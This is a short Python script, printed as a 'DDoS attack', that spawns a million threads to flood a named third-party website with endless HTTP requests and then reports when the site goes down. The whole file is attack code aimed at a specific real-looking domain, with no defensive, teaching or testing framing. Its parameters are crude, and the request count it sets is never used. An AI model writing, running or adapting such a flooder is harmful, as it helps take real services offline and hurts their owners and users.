import requests
import threading
import time

# Configuration
target_url = "http://www.aremaxcess.com"
num_requests = 1000000000  # 1 billion requests
threads = 1000000  # 1 million threads
timeout = 30  # Timeout in seconds

def ddos_thread():
    while True:
        try:
            response = requests.get(target_url, timeout=timeout)
            if response.status_code == 200:
                print(f"Request successful: {response.status_code}")
            else:
                print(f"Request failed: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Request exception: {e}")

def check_website_status():
    while True:
        try:
            response = requests.get(target_url, timeout=timeout)
            if response.status_code != 200:
                print(f"The website {target_url} is down.")
                break
        except requests.exceptions.RequestException:
            print(f"The website {target_url} is down.")
            break
        time.sleep(1)

def main():
    print(f"Starting DDoS attack on {target_url} with {threads} threads and {num_requests} requests.")

    threads_list = []
    for _ in range(threads):
        thread = threading.Thread(target=ddos_thread)
        thread.start()
        threads_list.append(thread)

    for thread in threads_list:
        thread.join()

    check_website_status()

if __name__ == "__main__":
    main()